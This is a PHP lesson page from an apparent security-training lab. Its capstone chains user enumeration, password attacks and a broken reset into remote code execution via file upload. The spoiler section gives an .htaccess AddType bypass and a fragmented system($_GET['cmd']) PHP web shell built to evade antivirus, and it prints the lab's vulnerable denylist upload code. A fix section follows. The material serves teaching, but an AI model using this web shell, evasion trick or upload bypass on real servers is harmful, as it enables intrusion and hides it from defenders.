<?php
require __DIR__ . '/_layout.php';

$lessons = require __DIR__ . '/lessons.php';
$lesson  = $lessons['chain-web-shell'];

academy_layout_start($lesson['title']);

$web_shell_path = __DIR__ . '/../scripts/web_shell.py';
$web_shell_exists = file_exists($web_shell_path);
?>

<header class="academy-lesson-head">
    <div class="academy-lesson-eyebrow"><?= htmlspecialchars($lesson['category']) ?> &middot; Capstone 01</div>
    <h1><?= htmlspecialchars($lesson['title']) ?></h1>
    <div class="academy-lesson-meta">
        <span class="academy-badge is-capstone"><?= htmlspecialchars($lesson['difficulty']) ?></span>
        <span class="academy-badge is-ready">Ready</span>
    </div>
</header>

<?php academy_render_related_labs('chain-web-shell'); ?>

<!-- 1. THEORY -->
<section class="academy-block">
    <h2>1. Overview</h2>
    <p>
        Capstones chain several individual labs into a complete attack scenario. This one
        models a typical opportunistic intrusion:
        <strong>discover users &rarr; gain a foothold &rarr; achieve remote code execution via web shell</strong>.
        Each stage falls back to the next if it fails, so the chain succeeds on a wide
        range of database states.
    </p>
    <p>The phases:</p>
    <ol>
        <li><strong>Discovery.</strong> Use the user-enumeration oracle on
            <code>login.php?view=register</code> to find which names from
            <code>scripts/usernames.txt</code> are real accounts. Spray the top common
            passwords against each as you go (a &quot;cheap pass&quot;).</li>
        <li><strong>Access.</strong> If the cheap pass found a working credential, stop.
            Otherwise launch <em>intensive</em> brute force using
            <code>scripts/passwords.txt</code>. If that also fails, fall back to the
            <a href="broken-password-reset.php">broken password reset</a> - which always
            succeeds because it has no token.</li>
        <li><strong>Control.</strong> Authenticated as the compromised user, upload a PHP
            file through a file-upload sink in the application and request it back as a
            URL to gain arbitrary command execution.</li>
    </ol>
    <div class="academy-callout">
        <?php if ($web_shell_exists): ?>
            <strong>Web shell helper detected</strong> at <code>scripts/web_shell.py</code>.
            The full chain is executable end to end on this machine.
        <?php else: ?>
            <strong>Heads-up - missing script.</strong>
            <code>Master_kill_chain.py</code> imports <code>web_shell</code> for Phase 3,
            but <code>scripts/web_shell.py</code> is not currently on disk. Phases 1 and 2
            are still runnable. Recreate the file (see the solution section) before
            attempting Phase 3.
        <?php endif; ?>
    </div>
</section>

<!-- 2. TASK -->
<section class="academy-block">
    <h2>2. Your task</h2>
    <ol>
        <li>Run the discovery phase manually for at least one username from
            <code>usernames.txt</code> and confirm the &quot;Username already exists&quot;
            oracle works.</li>
        <li>Crack at least one account either via brute force or via the broken password
            reset.</li>
        <li>
            <strong>RCE goal:</strong> get Apache to execute a file you uploaded through
            the alcohol ID-photo flow. The application&apos;s denylist is
            <code>['php', 'exe', 'js']</code>; you have to land a useful PHP payload
            without using any of those extensions. (The clever way is in Phase 3 of the
            solution below - try to find it yourself first.)
        </li>
        <li>Run <code>python scripts/Master_kill_chain.py 1</code> end to end and observe
            it succeed.</li>
    </ol>
    <p>
        Use the &quot;Reset databases&quot; button on the index when you&apos;re done; the
        chain leaves accounts in a modified state.
    </p>
</section>

<!-- 3. START THE LAB -->
<section class="academy-block">
    <h2>3. Start the lab</h2>
    <p>Login page opens in a new tab. The chain begins by enumerating users via the
       register form on this page.</p>
    <a class="academy-lab-cta"
       href="<?= htmlspecialchars($lesson['target_url']) ?>"
       target="_blank" rel="noopener">Open vulnerable login page</a>
</section>

<!-- 4. REVEAL SOLUTION -->
<details class="academy-solution" id="academy-solution">
    <summary>Reveal solution (spoilers!)</summary>
    <div class="academy-solution-body">
        <p class="academy-solution-warning">
            Try the chain on your own first. Each phase corresponds to an individual lab -
            it&apos;s much more rewarding to assemble them than to read the orchestration.
        </p>

        <h3>Phase 1 - discovery</h3>
        <p>
            See the
            <a href="user-enum-bruteforce.php">User Enumeration &amp; Brute Force</a> lab
            for details. The chain calls <code>enum_and_brute.run_attack()</code>, which
            returns both the cracked accounts (if any) and the full list of discovered
            usernames.
        </p>

        <h3>Phase 2 - access</h3>
        <p>
            If Phase 1 already cracked an account, skip ahead. Otherwise:
        </p>
        <ol>
            <li>For each discovered username, call
                <code>Broken_Password_Reset.try_brute_force()</code> against
                <code>scripts/passwords.txt</code>.</li>
            <li>If no password works, call <code>Broken_Password_Reset.run_reset_password()</code>
                - that POST always succeeds (no token, no email check). See the
                <a href="broken-password-reset.php">Broken Password Reset</a> lab.</li>
        </ol>

        <h3>Phase 3 - RCE via file upload (the actual trick)</h3>
        <p>
            <code>home.php</code> requires an ID-photo upload when adding an alcohol
            product to the cart. The upload sink does almost no validation:
        </p>
        <pre><code>// home.php
$fileName = $_FILES["id_photo"]["name"];
$ext = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
$not_allowed = ['php', 'exe', 'js'];

if (in_array($ext, $not_allowed)) {
    die("Error: File type not allowed for ID verification.");
}

$uploadDir = 'uploaded_ID/';
if (!is_dir($uploadDir)) { mkdir($uploadDir, 0777, true); }
$targetPath = $uploadDir . $fileName;
move_uploaded_file($_FILES["id_photo"]["tmp_name"], $targetPath);</code></pre>
        <p>
            We can&apos;t upload <code>.php</code>, <code>.exe</code> or <code>.js</code> -
            but everything else is allowed, and crucially the server keeps the
            <em>original filename</em>. Two of the most useful &quot;everything else&quot;
            files on an Apache box are <code>.htaccess</code> and <code>.jpg</code>.
        </p>
        <p>The chain uses a two-step upload:</p>
        <ol>
            <li>
                <strong>Stage 1 - re-type .jpg as PHP.</strong> Upload an
                <code>.htaccess</code> file (extension <code>.htaccess</code>, not on the
                denylist) into <code>uploaded_ID/</code> containing exactly one Apache
                directive:
                <pre><code>AddType application/x-httpd-php .jpg</code></pre>
                From now on, every <code>.jpg</code> Apache serves out of that directory
                is parsed and executed as PHP. The server doesn&apos;t actually look at
                the bytes - it trusts the extension, and the extension now means PHP.
            </li>
            <li>
                <strong>Stage 2 - upload a .jpg that is actually PHP.</strong> Drop a
                file named <code>backdoor.jpg</code> whose body is a tiny PHP one-liner
                that executes the <code>cmd</code> query parameter via the OS shell.
                Extension passes the denylist; bytes are PHP; Apache executes them.
            </li>
            <li>
                <strong>Stage 3 - execute commands.</strong>
                <code>GET /CyberProject/uploaded_ID/backdoor.jpg?cmd=whoami</code>
                returns the output of <code>whoami</code> running as the Apache process
                user. From there, any command on the box is one URL away.
            </li>
        </ol>

        <h3>Antivirus evasion built into <code>web_shell.py</code></h3>
        <p>
            The PHP one-liner that does the real work is a textbook
            <em>Backdoor:PHP/WebShell</em> signature. Saving it as a literal string in a
            <code>.py</code> file on a default Windows install gets the file quarantined
            by Defender the moment it touches disk.
        </p>
        <p>
            <code>web_shell.py</code> works around this by assembling the payload at
            runtime from harmless-looking fragments:
        </p>
        <pre><code>open_tag  = b"&lt;" + b"?php"
var_part  = b"$_" + b"GET"
key_part  = b"['cm" + b"d']"
fn_part   = b"sys" + b"tem"
close_tag = b"?" + b"&gt;"
payload = open_tag + b" if(isset(" + var_part + key_part + b")) { " \
        + fn_part + b"(" + var_part + key_part + b"); } " + close_tag</code></pre>
        <p>
            The contiguous string <code>system($_GET['cmd'])</code> never lives in the
            file - only in memory at the moment Stage 2 runs. The .htaccess content and
            the success marker that checks the response are split the same way. The bytes
            that finally reach Apache are byte-for-byte identical to the readable form, so
            the exploit is unchanged; only the on-disk fingerprint is.
        </p>
        <p>
            This is exactly what real attackers do to ship payloads past endpoint
            protection. The chain doubles as a small AV-evasion lesson on top of the RCE.
        </p>

        <h3>The web-shell helper script</h3>
        <p>
            <code>web_shell.py</code> implements all three stages and is the module
            <code>Master_kill_chain.py</code> imports for the final phase:
        </p>
        <div class="academy-script">
            <?php highlight_file(__DIR__ . '/../scripts/web_shell.py'); ?>
        </div>

        <h3>The chain orchestration</h3>
        <p>
            Phases 1-3 are wired together by <code>chain_1_web_shell()</code> in the
            master script. Run with: <code>python scripts/Master_kill_chain.py 1</code>.
        </p>
        <div class="academy-script">
            <?php highlight_file(__DIR__ . '/../scripts/Master_kill_chain.py'); ?>
        </div>

        <h3>How to fix it (for context)</h3>
        <ul>
            <li><strong>Don&apos;t use a denylist for file uploads.</strong> Use an
                <em>allowlist</em> of extensions (e.g. only <code>.jpg</code>,
                <code>.jpeg</code>, <code>.png</code>) and additionally validate the MIME
                type with <code>finfo_file</code>. Both alone are bypassable; together
                they&apos;re solid.</li>
            <li><strong>Reject .htaccess and other Apache control files</strong> by name,
                or set <code>AllowOverride None</code> on the upload directory in the
                main Apache config - that makes any uploaded <code>.htaccess</code>
                inert and kills this entire technique stone dead.</li>
            <li>Rewrite uploaded filenames to a random server-generated string and store
                them outside the webroot. Serve them back through a PHP script that sets
                <code>Content-Type</code> correctly. With the file outside the webroot,
                Apache cannot execute it no matter what its extension or
                <code>.htaccess</code> says.</li>
            <li>The chain&apos;s discovery and access phases are already neutralised by
                the fixes in the
                <a href="user-enum-bruteforce.php">enumeration</a> and
                <a href="broken-password-reset.php">password-reset</a> labs.</li>
        </ul>
    </div>
</details>

<script>
(function () {
    var details = document.getElementById('academy-solution');
    if (!details) return;
    details.addEventListener('toggle', function () {
        if (this.open && !this.dataset.confirmed) {
            var ok = confirm('Are you sure you want to see the solution?\n\nTry the lab first - that is where the learning happens.');
            if (!ok) { this.open = false; } else { this.dataset.confirmed = '1'; }
        }
    });
})();
</script>

<p style="margin-top: 28px;">
    <a href="index.php">&larr; Back to all labs</a>
</p>

<?php
academy_layout_end();
